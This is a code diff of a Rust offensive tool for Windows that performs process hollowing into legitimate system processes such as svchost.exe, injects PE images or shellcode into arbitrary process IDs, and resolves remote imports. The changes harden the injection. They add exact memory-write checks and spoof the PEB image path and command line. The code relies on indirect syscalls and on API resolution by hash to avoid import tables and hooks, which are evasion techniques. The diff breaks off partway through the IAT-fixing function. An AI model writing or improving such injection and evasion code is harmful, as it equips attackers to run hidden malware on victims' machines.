@@ -162,6 +162,118 @@ struct IoStatusBlock {
 /// MEM_RELEASE for NtFreeVirtualMemory.
 #[cfg(windows)] const NT_MEM_RELEASE: u32 = 0x8000;
 
+#[cfg(windows)]
+unsafe fn nt_read_exact(
+    hprocess: *mut c_void,
+    remote_addr: usize,
+    local_buf: *mut c_void,
+    len: usize,
+) -> bool {
+    if remote_addr == 0 || local_buf.is_null() || len == 0 {
+        return false;
+    }
+    let mut read = 0usize;
+    let status = nt_syscall::syscall!(
+        "NtReadVirtualMemory",
+        hprocess as u64,
+        remote_addr as u64,
+        local_buf as u64,
+        len as u64,
+        &mut read as *mut _ as u64,
+    )
+    .unwrap_or(-1);
+    status >= 0 && read == len
+}
+
+#[cfg(windows)]
+unsafe fn nt_write_exact(
+    hprocess: *mut c_void,
+    remote_addr: usize,
+    local_buf: *const c_void,
+    len: usize,
+) -> bool {
+    if remote_addr == 0 || local_buf.is_null() || len == 0 {
+        return false;
+    }
+    let mut written = 0usize;
+    let status = nt_syscall::syscall!(
+        "NtWriteVirtualMemory",
+        hprocess as u64,
+        remote_addr as u64,
+        local_buf as u64,
+        len as u64,
+        &mut written as *mut _ as u64,
+    )
+    .unwrap_or(-1);
+    status >= 0 && written == len
+}
+
+#[cfg(windows)]
+unsafe fn remote_region_covers(
+    hprocess: *mut c_void,
+    remote_addr: usize,
+    required_len: usize,
+    require_writable: bool,
+) -> bool {
+    if remote_addr == 0 || required_len == 0 {
+        return false;
+    }
+
+    let mut mbi: winapi::um::winnt::MEMORY_BASIC_INFORMATION = std::mem::zeroed();
+    let mut ret_len: usize = 0;
+    let status = nt_syscall::syscall!(
+        "NtQueryVirtualMemory",
+        hprocess as u64,
+        remote_addr as u64,
+        0u64, // MemoryBasicInformation
+        &mut mbi as *mut _ as u64,
+        std::mem::size_of::<winapi::um::winnt::MEMORY_BASIC_INFORMATION>() as u64,
+        &mut ret_len as *mut _ as u64,
+    )
+    .unwrap_or(-1);
+
+    if status < 0 {
+        return false;
+    }
+
+    const MEM_COMMIT_STATE: u32 = 0x1000;
+    const PAGE_NOACCESS_PROT: u32 = 0x01;
+    const PAGE_READWRITE_PROT: u32 = 0x04;
+    const PAGE_WRITECOPY_PROT: u32 = 0x08;
+    const PAGE_EXECUTE_READWRITE_PROT: u32 = 0x40;
+    const PAGE_EXECUTE_WRITECOPY_PROT: u32 = 0x80;
+
+    if (mbi.State as u32) != MEM_COMMIT_STATE {
+        return false;
+    }
+
+    let region_base = mbi.BaseAddress as usize;
+    let region_end = region_base.saturating_add(mbi.RegionSize);
+    let requested_end = remote_addr.saturating_add(required_len);
+    if requested_end > region_end {
+        return false;
+    }
+
+    let protect = (mbi.Protect as u32) & 0xFF;
+    if protect == PAGE_NOACCESS_PROT {
+        return false;
+    }
+    if require_writable {
+        let writable = matches!(
+            protect,
+            PAGE_READWRITE_PROT
+                | PAGE_WRITECOPY_PROT
+                | PAGE_EXECUTE_READWRITE_PROT
+                | PAGE_EXECUTE_WRITECOPY_PROT
+        );
+        if !writable {
+            return false;
+        }
+    }
+
+    true
+}
+
 /// Resolve a function from the loaded `ntdll.dll` via PEB-walk.
 #[cfg(windows)]
 #[inline]
@@ -295,6 +407,125 @@ unsafe fn create_suspended_process_nt(exe_path: &str) -> Result<(*mut c_void, *m
         let _ = nt_syscall::syscall!("NtClose", h_process as u64);
         return Err(anyhow!("NtCreateThreadEx({}) NTSTATUS {:#010x}", exe_path, s as u32));
     }
+
+    Ok((h_process, h_thread))
+}
+
+/// Create a suspended **WOW64 (32-bit)** child process.
+///
+/// `NtCreateProcessEx` with `NT_CURRENT_PROCESS` always creates a child of
+/// the same bitness as the caller (64-bit).  For PE32 process hollowing we
+/// need a 32-bit host.  This function resolves `CreateProcessW` from
+/// kernel32 via PEB-walk (no IAT hook) and uses `CREATE_SUSPENDED` so the
+/// process is frozen before any entry point runs.
+///
+/// Returns `(hProcess, hThread)`.  The caller must close both handles.
+#[cfg(windows)]
+unsafe fn create_suspended_wow64_process(exe_path: &str) -> Result<(*mut c_void, *mut c_void)> {
+    use std::sync::OnceLock;
+
+    // Resolve CreateProcessW from kernel32 via PEB-walk — no IAT entry.
+    type FnCreateProcessW = unsafe extern "system" fn(
+        *const u16,       // lpApplicationName
+        *mut u16,         // lpCommandLine (mutable per MSDN)
+        *mut c_void,      // lpProcessAttributes
+        *mut c_void,      // lpThreadAttributes
+        i32,              // bInheritHandles
+        u32,              // dwCreationFlags
+        *mut c_void,      // lpEnvironment
+        *const u16,       // lpCurrentDirectory
+        *const c_void,    // lpStartupInfo  (STARTUPINFOW)
+        *mut c_void,      // lpProcessInformation (PROCESS_INFORMATION)
+    ) -> i32;
+
+    static CREATE_PROCESS_W: OnceLock<Option<FnCreateProcessW>> = OnceLock::new();
+    let fn_ptr = CREATE_PROCESS_W.get_or_init(|| {
+        let kernel32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
+        let addr = pe_resolve::get_proc_address_by_hash(
+            kernel32,
+            pe_resolve::hash_str(b"CreateProcessW\0"),
+        )?;
+        Some(std::mem::transmute(addr))
+    });
+    let create_process = fn_ptr
+        .ok_or_else(|| anyhow!("create_suspended_wow64: CreateProcessW not found via PEB-walk"))?;
+
+    // Convert to wide string with null terminator.
+    let mut exe_wide: Vec<u16> = exe_path.encode_utf16().chain(std::iter::once(0)).collect();
+
+    // STARTUPINFOW — minimal, cb field set to struct size.
+    #[repr(C)]
+    struct StartupInfoW {
+        cb: u32,
+        lp_reserved: *mut c_void,
+        lp_desktop: *mut c_void,
+        lp_title: *mut c_void,
+        dw_x: u32,
+        dw_y: u32,
+        dw_x_size: u32,
+        dw_y_size: u32,
+        dw_x_count_chars: u32,
+        dw_y_count_chars: u32,
+        dw_fill_attribute: u32,
+        dw_flags: u32,
+        w_show_window: u16,
+        cb_reserved2: u16,
+        lp_reserved2: *mut u8,
+        h_std_input: *mut c_void,
+        h_std_output: *mut c_void,
+        h_std_error: *mut c_void,
+    }
+
+    // PROCESS_INFORMATION — receives handles and PIDs.
+    #[repr(C)]
+    struct ProcessInformation {
+        h_process: *mut c_void,
+        h_thread: *mut c_void,
+        dw_process_id: u32,
+        dw_thread_id: u32,
+    }
+
+    const CREATE_SUSPENDED: u32 = 0x0000_0004;
+
+    let mut si = std::mem::zeroed::<StartupInfoW>();
+    si.cb = std::mem::size_of::<StartupInfoW>() as u32;
+    let mut pi = std::mem::zeroed::<ProcessInformation>();
+
+    let ok = create_process(
+        exe_wide.as_ptr(),           // lpApplicationName
+        exe_wide.as_mut_ptr(),       // lpCommandLine (same buffer is fine)
+        std::ptr::null_mut(),        // lpProcessAttributes
+        std::ptr::null_mut(),        // lpThreadAttributes
+        0,                           // bInheritHandles = FALSE
+        CREATE_SUSPENDED,            // dwCreationFlags
+        std::ptr::null_mut(),        // lpEnvironment (inherit)
+        std::ptr::null(),            // lpCurrentDirectory (inherit)
+        &si as *const _ as *const c_void,  // lpStartupInfo
+        &mut pi as *mut _ as *mut c_void,  // lpProcessInformation
+    );
+
+    if ok == 0 {
+        let err = get_last_error();
+        return Err(anyhow!(
+            "create_suspended_wow64: CreateProcessW({}) failed with GetLastError={}",
+            exe_path, err
+        ));
+    }
+
+    let h_process = pi.h_process;
+    let h_thread = pi.h_thread;
+
+    if h_process.is_null() || h_thread.is_null() {
+        return Err(anyhow!(
+            "create_suspended_wow64: CreateProcessW returned NULL handles for {}",
+            exe_path
+        ));
+    }
+
+    tracing::debug!(
+        "create_suspended_wow64: launched {} as WOW64 suspended process (PID {})",
+        exe_path, pi.dw_process_id
+    );
 
     Ok((h_process, h_thread))
 }
@@ -720,8 +951,8 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
             let sec = &*first_section.add(i);
             let raw_off = sec.PointerToRawData as usize;
             let raw_sz  = sec.SizeOfRawData as usize;
-            let virt_sz = *sec.Misc.VirtualSize() as usize;
-            let copy_sz = raw_sz.min(virt_sz);
+            let max_in_image = image_size.saturating_sub(sec.VirtualAddress as usize);
+            let copy_sz = raw_sz.min(max_in_image);
             if raw_off == 0 || raw_sz == 0 || raw_off + copy_sz > payload.len() || copy_sz == 0 {
                 continue;
             }
@@ -811,117 +1042,159 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
         // UNICODE_STRING (x64) = { Length: u16, MaxLength: u16, _pad: u32, Buffer: *mut u16 }
         //   total = 16 bytes on x64
         {
+            const PEB_PROCESS_PARAMETERS_OFFSET_X64: usize = 0x20;
+            const RTL_IMAGE_PATH_OFFSET_X64: usize = 0x60;
+            const RTL_COMMAND_LINE_OFFSET_X64: usize = 0x70;
+
+            let us_size = std::mem::size_of::<winapi::shared::ntdef::UNICODE_STRING>();
+            let min_params_span = RTL_COMMAND_LINE_OFFSET_X64 + us_size;
+
             // Read the ProcessParameters pointer from PEB+0x20.
             let mut params_ptr: usize = 0;
-            let mut rd_params: usize = 0;
-            let params_read = nt_syscall::syscall!(
-                "NtReadVirtualMemory",
-                h_process as u64,
-                peb_ptr.add(0x20) as u64,
-                &mut params_ptr as *mut _ as u64,
-                std::mem::size_of::<usize>() as u64,
-                &mut rd_params as *mut _ as u64,
+            let params_ok = nt_read_exact(
+                h_process,
+                peb_ptr.add(PEB_PROCESS_PARAMETERS_OFFSET_X64) as usize,
+                &mut params_ptr as *mut _ as *mut c_void,
+                std::mem::size_of::<usize>(),
             );
-            match params_read {
-                Ok(s) if s >= 0 && rd_params == std::mem::size_of::<usize>() && params_ptr != 0 => {}
-                _ => {
+            if !params_ok || params_ptr == 0 {
+                tracing::warn!(
+                    "hollow_and_execute: failed to read PEB.ProcessParameters, skipping update"
+                );
+            } else if !remote_region_covers(h_process, params_ptr, min_params_span, false) {
+                tracing::warn!(
+                    "hollow_and_execute: ProcessParameters pointer {:p} does not cover required layout span, skipping update",
+                    params_ptr as *const c_void
+                );
+            } else {
+                let image_us_addr = params_ptr + RTL_IMAGE_PATH_OFFSET_X64;
+                let cmd_us_addr = params_ptr + RTL_COMMAND_LINE_OFFSET_X64;
+
+                let mut image_us: winapi::shared::ntdef::UNICODE_STRING = std::mem::zeroed();
+                let mut cmd_us: winapi::shared::ntdef::UNICODE_STRING = std::mem::zeroed();
+
+                let image_us_ok = nt_read_exact(
+                    h_process,
+                    image_us_addr,
+                    &mut image_us as *mut _ as *mut c_void,
+                    us_size,
+                );
+                let cmd_us_ok = nt_read_exact(
+                    h_process,
+                    cmd_us_addr,
+                    &mut cmd_us as *mut _ as *mut c_void,
+                    us_size,
+                );
+
+                if !image_us_ok || !cmd_us_ok {
                     tracing::warn!(
-                        "hollow_and_execute: failed to read PEB.ProcessParameters, skipping update"
-                    );
-                    // Non-fatal: the process can still run without this update.
-                }
-            }
-
-            if params_ptr != 0 {
-                let params_addr = params_ptr as *const u8;
-
-                // Build a wide (UTF-16LE) version of the host path for the
-                // UNICODE_STRING buffers.  We use the NT path format
-                // (\??\C:\...) since that is what the kernel stores.
-                let wide_path = dos_to_nt_path(&host_path);
-                // dos_to_nt_path already null-terminates.
-                // Length excludes the trailing null.
-                let path_byte_len = (wide_path.len().saturating_sub(1)) * 2;
-
-                // Allocate remote memory for the wide path string.
-                let mut str_buf: *mut c_void = std::ptr::null_mut();
-                let mut str_buf_sz: usize = (wide_path.len() * 2 + 64) & !63; // page-aligned
-                let alloc_status = nt_syscall::syscall!(
-                    "NtAllocateVirtualMemory",
-                    h_process as u64, &mut str_buf as *mut _ as u64,
-                    0u64, &mut str_buf_sz as *mut _ as u64,
-                    (MEM_COMMIT | MEM_RESERVE) as u64, PAGE_READWRITE as u64,
-                ).unwrap_or(-1);
-                if alloc_status < 0 || str_buf.is_null() {
-                    tracing::warn!(
-                        "hollow_and_execute: failed to alloc remote buffer for \
-                         ProcessParameters path, skipping update"
+                        "hollow_and_execute: could not read existing ProcessParameters UNICODE_STRING entries, skipping update"
                     );
                 } else {
-                    // Write the wide path into the remote allocation.
-                    let mut path_written: usize = 0;
-                    let write_path = nt_syscall::syscall!(
-                        "NtWriteVirtualMemory",
-                        h_process as u64, str_buf as u64,
-                        wide_path.as_ptr() as u64,
-                        (wide_path.len() * 2) as u64,
-                        &mut path_written as *mut _ as u64,
-                    );
-                    if write_path.unwrap_or(-1) < 0 {
+                    let wide_path = dos_to_nt_path(&host_path);
+                    let full_len_bytes = wide_path.len().saturating_mul(2);
+                    let path_len_bytes = full_len_bytes.saturating_sub(2); // exclude trailing NUL
+
+                    if full_len_bytes > u16::MAX as usize || path_len_bytes > u16::MAX as usize {
                         tracing::warn!(
-                            "hollow_and_execute: failed to write remote path buffer, \
-                             skipping ProcessParameters update"
+                            "hollow_and_execute: host path too long for UNICODE_STRING ({} bytes), skipping ProcessParameters update",
+                            full_len_bytes
                         );
                     } else {
-                        // Build the UNICODE_STRING struct to write.
-                        // UNICODE_STRING on x64 = { u16 Length, u16 MaxLength, u32 _pad, u64 Buffer }
-                        //   = 16 bytes total.
-                        let path_byte_len_u16 = path_byte_len as u16;
-                        let max_len = (wide_path.len() * 2) as u16;
-                        let mut us_bytes = [0u8; 16];
-                        us_bytes[0..2].copy_from_slice(&path_byte_len_u16.to_le_bytes());
-                        us_bytes[2..4].copy_from_slice(&max_len.to_le_bytes());
-                        // bytes 4..8 are padding (zero)
-                        us_bytes[8..16].copy_from_slice(&(str_buf as usize).to_le_bytes());
+                        let is_usable_buffer = |us: &winapi::shared::ntdef::UNICODE_STRING| {
+                            us.Buffer as usize != 0
+                                && us.MaximumLength >= us.Length
+                                && us.MaximumLength as usize >= full_len_bytes
+                                && remote_region_covers(
+                                    h_process,
+                                    us.Buffer as usize,
+                                    us.MaximumLength as usize,
+                                    true,
+                                )
+                        };
 
-                        // Update ImagePathName at RTL_USER_PROCESS_PARAMETERS +0x60.
-                        let mut us_written: usize = 0;
-                        let write_img = nt_syscall::syscall!(
-                            "NtWriteVirtualMemory",
-                            h_process as u64,
-                            params_addr.add(0x60) as u64,
-                            us_bytes.as_ptr() as u64,
-                            16u64,
-                            &mut us_written as *mut _ as u64,
-                        );
-                        if write_img.as_ref().map(|r| *r).unwrap_or(-1) < 0 {
-                            tracing::warn!(
-                                "hollow_and_execute: failed to update ImagePathName, \
-                                 NTSTATUS {:#010x}", write_img.as_ref().map(|r| *r).unwrap_or(-1) as u32);
+                        let mut target_buf: *mut u16 = std::ptr::null_mut();
+                        if is_usable_buffer(&image_us) {
+                            target_buf = image_us.Buffer;
+                        } else if is_usable_buffer(&cmd_us) {
+                            target_buf = cmd_us.Buffer;
+                        } else {
+                            let mut str_buf: *mut c_void = std::ptr::null_mut();
+                            let mut str_buf_sz: usize = (full_len_bytes + 63) & !63;
+                            if str_buf_sz == 0 {
+                                str_buf_sz = 64;
+                            }
+                            let alloc_status = nt_syscall::syscall!(
+                                "NtAllocateVirtualMemory",
+                                h_process as u64,
+                                &mut str_buf as *mut _ as u64,
+                                0u64,
+                                &mut str_buf_sz as *mut _ as u64,
+                                (MEM_COMMIT | MEM_RESERVE) as u64,
+                                PAGE_READWRITE as u64,
+                            )
+                            .unwrap_or(-1);
+                            if alloc_status < 0
+                                || str_buf.is_null()
+                                || !remote_region_covers(
+                                    h_process,
+                                    str_buf as usize,
+                                    full_len_bytes,
+                                    true,
+                                )
+                            {
+                                tracing::warn!(
+                                    "hollow_and_execute: failed to provision validated remote string buffer for ProcessParameters update"
+                                );
+                            } else {
+                                target_buf = str_buf as *mut u16;
+                            }
                         }
 
-                        // Update CommandLine at RTL_USER_PROCESS_PARAMETERS +0x70.
-                        let mut cl_written: usize = 0;
-                        let write_cmd = nt_syscall::syscall!(
-                            "NtWriteVirtualMemory",
-                            h_process as u64,
-                            params_addr.add(0x70) as u64,
-                            us_bytes.as_ptr() as u64,
-                            16u64,
-                            &mut cl_written as *mut _ as u64,
-                        );
-                        if write_cmd.as_ref().map(|r| *r).unwrap_or(-1) < 0 {
-                            tracing::warn!(
-                                "hollow_and_execute: failed to update CommandLine, \
-                                 NTSTATUS {:#010x}", write_cmd.as_ref().map(|r| *r).unwrap_or(-1) as u32);
-                        }
-
-                        if write_img.as_ref().map(|r| *r).unwrap_or(-1) >= 0 && write_cmd.as_ref().map(|r| *r).unwrap_or(-1) >= 0 {
-                            tracing::debug!(
-                                "hollow_and_execute: updated PEB ProcessParameters \
-                                 ImagePathName/CommandLine to {}",
-                                host_path
+                        if !target_buf.is_null() {
+                            let path_written = nt_write_exact(
+                                h_process,
+                                target_buf as usize,
+                                wide_path.as_ptr() as *const c_void,
+                                full_len_bytes,
                             );
+                            if !path_written {
+                                tracing::warn!(
+                                    "hollow_and_execute: failed to write validated ProcessParameters path buffer"
+                                );
+                            } else {
+                                let mut new_us = winapi::shared::ntdef::UNICODE_STRING {
+                                    Length: path_len_bytes as u16,
+                                    MaximumLength: full_len_bytes as u16,
+                                    Buffer: target_buf,
+                                };
+
+                                let wrote_image = nt_write_exact(
+                                    h_process,
+                                    image_us_addr,
+                                    &new_us as *const _ as *const c_void,
+                                    us_size,
+                                );
+                                let wrote_cmd = nt_write_exact(
+                                    h_process,
+                                    cmd_us_addr,
+                                    &new_us as *const _ as *const c_void,
+                                    us_size,
+                                );
+
+                                if wrote_image && wrote_cmd {
+                                    tracing::debug!(
+                                        "hollow_and_execute: updated validated ProcessParameters ImagePathName/CommandLine to {}",
+                                        host_path
+                                    );
+                                } else {
+                                    tracing::warn!(
+                                        "hollow_and_execute: failed writing ProcessParameters UNICODE_STRING metadata (image={}, cmd={})",
+                                        wrote_image,
+                                        wrote_cmd
+                                    );
+                                }
+                            }
                         }
                     }
                 }
@@ -1065,21 +1338,24 @@ unsafe fn hollow_and_execute_pe32(payload: &[u8]) -> Result<()> {
     }; }
 
     // Prefer SysWOW64 path for 32-bit host process; fall back through candidate list.
+    // NOTE: we use create_suspended_wow64_process (CreateProcessW via PEB-walk)
+    // instead of create_suspended_process_nt (NtCreateProcessEx) because the
+    // latter always creates a 64-bit child when the parent is 64-bit, which
+    // would produce the wrong bitness for PE32 hollowing.
     let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".to_string());
     let candidates = vec![
         format!(r"{}\SysWOW64\svchost.exe", sysroot),
         format!(r"{}\SysWOW64\RuntimeBroker.exe", sysroot),
         format!(r"{}\SysWOW64\dllhost.exe", sysroot),
-        format!(r"{}\System32\svchost.exe", sysroot),
     ];
     let (h_process, h_thread) = {
         let mut result: Result<(*mut c_void, *mut c_void)> =
-            Err(anyhow!("hollow_and_execute(pe32): all host process candidates failed"));
+            Err(anyhow!("hollow_and_execute(pe32): all WOW64 host process candidates failed"));
         for path in &candidates {
-            match create_suspended_process_nt(path) {
+            match create_suspended_wow64_process(path) {
                 Ok(handles) => { result = Ok(handles); break; }
                 Err(e) => tracing::debug!(
-                    "hollow_and_execute(pe32): candidate {} failed: {}", path, e),
+                    "hollow_and_execute(pe32): WOW64 candidate {} failed: {}", path, e),
             }
         }
         result?
@@ -1181,8 +1457,8 @@ unsafe fn hollow_and_execute_pe32(payload: &[u8]) -> Result<()> {
         let sec = &*first_section.add(i);
         let raw_off = sec.PointerToRawData as usize;
         let raw_sz  = sec.SizeOfRawData as usize;
-        let virt_sz = *sec.Misc.VirtualSize() as usize;
-        let copy_sz = raw_sz.min(virt_sz);
+        let max_in_image = image_size.saturating_sub(sec.VirtualAddress as usize);
+        let copy_sz = raw_sz.min(max_in_image);
         if raw_off == 0 || raw_sz == 0 || raw_off + copy_sz > payload.len() || copy_sz == 0 {
             continue;
         }
@@ -1238,19 +1514,45 @@ unsafe fn hollow_and_execute_pe32(payload: &[u8]) -> Result<()> {
             let set_ctx_status = nt_syscall::syscall!(
                 "NtSetContextThread", h_thread as u64, &ctx as *const _ as u64,
             );
-            if let Err(e) = set_ctx_status {
-                tracing::warn!("hollow_and_execute(pe32): NtSetContextThread failed: {}", e);
-            } else if let Ok(s2) = set_ctx_status {
-                if s2 < 0 {
-                    tracing::warn!(
-                        "hollow_and_execute(pe32): NtSetContextThread NTSTATUS {:#010x}; continuing",
-                        s2 as u32);
+            match set_ctx_status {
+                Ok(s2) if s2 >= 0 => {}
+                Ok(s2) => {
+                    nt_terminate!(h_process);
+                    close_handle!(h_thread);
+                    close_handle!(h_process);
+                    return Err(anyhow!(
+                        "hollow_and_execute(pe32): NtSetContextThread failed: NTSTATUS {:#010x}",
+                        s2 as u32
+                    ));
+                }
+                Err(e) => {
+                    nt_terminate!(h_process);
+                    close_handle!(h_thread);
+                    close_handle!(h_process);
+                    return Err(anyhow!(
+                        "hollow_and_execute(pe32): NtSetContextThread failed: {}",
+                        e
+                    ));
                 }
             }
         }
-        _ => {
-            tracing::warn!(
-                "hollow_and_execute(pe32): NtGetContextThread failed before PEB image-base update; skipping PEB write");
+        Ok(s) => {
+            nt_terminate!(h_process);
+            close_handle!(h_thread);
+            close_handle!(h_process);
+            return Err(anyhow!(
+                "hollow_and_execute(pe32): NtGetContextThread failed: NTSTATUS {:#010x}",
+                s as u32
+            ));
+        }
+        Err(e) => {
+            nt_terminate!(h_process);
+            close_handle!(h_thread);
+            close_handle!(h_process);
+            return Err(anyhow!(
+                "hollow_and_execute(pe32): NtGetContextThread failed: {}",
+                e
+            ));
         }
     }
 
@@ -1260,7 +1562,28 @@ unsafe fn hollow_and_execute_pe32(payload: &[u8]) -> Result<()> {
         (*nt).OptionalHeader.SizeOfImage as u64,
     );
 
-    let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
+    let resume_status = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
+    match resume_status {
+        Ok(s) if s >= 0 => {}
+        Ok(s) => {
+            nt_terminate!(h_process);
+            close_handle!(h_thread);
+            close_handle!(h_process);
+            return Err(anyhow!(
+                "hollow_and_execute(pe32): NtResumeThread failed: NTSTATUS {:#010x}",
+                s as u32
+            ));
+        }
+        Err(e) => {
+            nt_terminate!(h_process);
+            close_handle!(h_thread);
+            close_handle!(h_process);
+            return Err(anyhow!(
+                "hollow_and_execute(pe32): NtResumeThread failed: {}",
+                e
+            ));
+        }
+    }
 
     close_handle!(h_thread);
     close_handle!(h_process);
@@ -1861,9 +2184,16 @@ pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
                 payload.as_ptr() as u64, (*nt).OptionalHeader.SizeOfHeaders as u64,
                 &mut written as *mut _ as u64,
             );
-            if write_status.map_or(true, |s| s < 0) {
+            if write_status.as_ref().map_or(true, |s| *s < 0)
+                || written != (*nt).OptionalHeader.SizeOfHeaders as usize
+            {
                 close_h!(hprocess);
-                return Err(anyhow!("NtWriteVirtualMemory(headers) failed: {:?}", write_status));
+                return Err(anyhow!(
+                    "NtWriteVirtualMemory(headers) failed: status={:?}, wrote={}, expected={}",
+                    write_status,
+                    written,
+                    (*nt).OptionalHeader.SizeOfHeaders
+                ));
             }
 
             let num_sections = (*nt).FileHeader.NumberOfSections as usize;
@@ -1873,19 +2203,31 @@ pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
                 let sec = &*first_section.add(i);
                 let raw_off = sec.PointerToRawData as usize;
                 let raw_sz = sec.SizeOfRawData as usize;
-                let virt_sz = *sec.Misc.VirtualSize() as usize;
-                let copy_sz = raw_sz.min(virt_sz);
+                let max_in_image = image_size.saturating_sub(sec.VirtualAddress as usize);
+                let copy_sz = raw_sz.min(max_in_image);
                 if raw_off == 0 || raw_sz == 0 || raw_off + copy_sz > payload.len() || copy_sz == 0 {
                     continue;
                 }
                 let dst = (remote_base + sec.VirtualAddress as usize) as *mut c_void;
                 // P0-13: NtWriteVirtualMemory for section data.
-                let _ = nt_syscall::syscall!(
+                written = 0;
+                let section_write_status = nt_syscall::syscall!(
                     "NtWriteVirtualMemory",
                     hprocess as u64, dst as u64,
                     payload.as_ptr().add(raw_off) as u64, copy_sz as u64,
                     &mut written as *mut _ as u64,
                 );
+                if section_write_status.as_ref().map_or(true, |s| *s < 0) || written != copy_sz {
+                    close_h!(hprocess);
+                    return Err(anyhow!(
+                        "NtWriteVirtualMemory(section {}, pid={}) failed: status={:?}, wrote={}, expected={}",
+                        i,
+                        pid,
+                        section_write_status,
+                        written,
+                        copy_sz
+                    ));
+                }
             }
 
             let delta = remote_base as isize - preferred_base as isize;
@@ -1983,22 +2325,42 @@ pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
             let remote_mem = remote_base_val as *mut c_void;
             let mut written: SIZE_T = 0;
             // P0-13: NtWriteVirtualMemory for shellcode.
-            let _ = nt_syscall::syscall!(
+            let shellcode_write_status = nt_syscall::syscall!(
                 "NtWriteVirtualMemory",
                 hprocess as u64, remote_mem as u64,
                 payload.as_ptr() as u64, payload.len() as u64,
                 &mut written as *mut _ as u64,
             );
+            if shellcode_write_status.as_ref().map_or(true, |s| *s < 0)
+                || written != payload.len()
+            {
+                close_h!(hprocess);
+                return Err(anyhow!(
+                    "NtWriteVirtualMemory(shellcode, pid={}) failed: status={:?}, wrote={}, expected={}",
+                    pid,
+                    shellcode_write_status,
+                    written,
+                    payload.len()
+                ));
+            }
             // P0-13: NtProtectVirtualMemory to RX.
             let mut old_prot = 0u32;
             let mut prot_base = remote_base_val;
             let mut prot_size = payload.len();
-            let _ = nt_syscall::syscall!(
+            let protect_status = nt_syscall::syscall!(
                 "NtProtectVirtualMemory",
                 hprocess as u64, &mut prot_base as *mut _ as u64,
                 &mut prot_size as *mut _ as u64,
                 PAGE_EXECUTE_READ as u64, &mut old_prot as *mut _ as u64,
             );
+            if protect_status.as_ref().map_or(true, |s| *s < 0) {
+                close_h!(hprocess);
+                return Err(anyhow!(
+                    "NtProtectVirtualMemory(shellcode, pid={}) failed: {:?}",
+                    pid,
+                    protect_status
+                ));
+            }
             // Flush I-cache before redirecting execution into the newly-written
             // shellcode (L-04 fix).
             // P0-13: NtFlushInstructionCache indirect syscall.
@@ -2143,6 +2505,8 @@ unsafe fn fix_iat_remote(
                 ).unwrap_or(-1);
                 let remote_block = if alloc_s >= 0 { rb } else { std::ptr::null_mut() };
                 if !remote_block.is_null() {
+                    let mut remote_load_failure: Option<String> = None;
+
                     let mut wr = 0usize;
                     let ws = nt_syscall::syscall!(
                         "NtWriteVirtualMemory",
@@ -2193,16 +2557,22 @@ unsafe fn fix_iat_remote(
                                     0u64, 0u64, 0u64, 0u64,
                                 ).unwrap_or(-1);
                                 if status >= 0 && !h_thread.is_null() {
+                                    let mut ldr_args_configured = false;
+
                                     #[cfg(target_arch = "x86_64")]
                                     {
                                         let mut ctx: CONTEXT = std::mem::zeroed();
                                         ctx.ContextFlags = CONTEXT_FULL;
-                                        if nt_syscall::syscall!(
+                                        let get_ctx = nt_syscall::syscall!(
                                             "NtGetContextThread",
                                             h_thread as u64, &mut ctx as *mut _ as u64,
-                                        ).unwrap_or(-1) < 0 {
+                                        ).unwrap_or(-1);
+                                        if get_ctx < 0 {
                                             tracing::warn!(
                                                 "fix_iat_remote: NtGetContextThread before LdrLoadDll failed"
+                                            );
+                                            remote_load_failure = Some(
+                                                "NtGetContextThread failed while preparing remote LdrLoadDll".to_string(),
                                             );
                                         } else {
                                             // LdrLoadDll(Path, Flags, ModuleFileName, ModuleHandle)
@@ -2210,63 +2580,95 @@ unsafe fn fix_iat_remote(
                                             ctx.Rdx = 0;
                                             ctx.R8 = remote_us_ptr as u64;
                                             ctx.R9 = remote_base_out as u64;
-                                            if nt_syscall::syscall!(
+                                            let set_ctx = nt_syscall::syscall!(
                                                 "NtSetContextThread",
                                                 h_thread as u64, &ctx as *const _ as u64,
-                                            ).unwrap_or(-1) < 0 {
+                                            ).unwrap_or(-1);
+                                            if set_ctx < 0 {
                                                 tracing::warn!(
                                                     "fix_iat_remote: NtSetContextThread for LdrLoadDll failed"
                                                 );
+                                                remote_load_failure = Some(
+                                                    "NtSetContextThread failed while preparing remote LdrLoadDll".to_string(),
+                                                );
+                                            } else {
+                                                ldr_args_configured = true;
                                             }
                                         }
                                     }
 
                                     #[cfg(not(target_arch = "x86_64"))]
                                     {
-                                        tracing::warn!(
-                                            "fix_iat_remote: remote LdrLoadDll argument setup only implemented on x86_64"
+                                        tracing::error!(
+                                            "fix_iat_remote: remote LdrLoadDll argument setup is unsupported on this architecture"
+                                        );
+                                        remote_load_failure = Some(
+                                            "remote LdrLoadDll argument setup unsupported on this architecture".to_string(),
                                         );
                                     }
 
-                                    let _ = nt_syscall::syscall!(
-                                        "NtResumeThread", h_thread as u64, 0u64,
-                                    );
-                                    // Wait with no timeout (null = infinite).
-                                    let _ = nt_syscall::syscall!(
-                                        "NtWaitForSingleObject", h_thread as u64,
-                                        0u64, 0u64,
-                                    );
+                                    if !ldr_args_configured {
+                                        let _ = nt_syscall::syscall!(
+                                            "NtTerminateThread",
+                                            h_thread as u64,
+                                            0u64,
+                                        );
+                                        pe_resolve::close_handle(h_thread as *mut core::ffi::c_void);
+                                    } else {
+                                        let _ = nt_syscall::syscall!(
+                                            "NtResumeThread", h_thread as u64, 0u64,
+                                        );
+                                        // Wait with no timeout (null = infinite).
+                                        let _ = nt_syscall::syscall!(
+                                            "NtWaitForSingleObject", h_thread as u64,
+                                            0u64, 0u64,
+                                        );
 
-                                    let mut loaded_remote_base: usize = 0;
-                                    let mut rd = 0usize;
-                                    let read_s = nt_syscall::syscall!(
-                                        "NtReadVirtualMemory",
-                                        hprocess as u64, remote_base_out as u64,
-                                        &mut loaded_remote_base as *mut _ as u64,
-                                        std::mem::size_of::<usize>() as u64,
-                                        &mut rd as *mut _ as u64,
-                                    ).unwrap_or(-1);
-                                    if read_s < 0 || rd != std::mem::size_of::<usize>() {
-                                        tracing::warn!(
-                                            "fix_iat_remote: could not read remote LdrLoadDll base output for {}",
-                                            dll_name_str
-                                        );
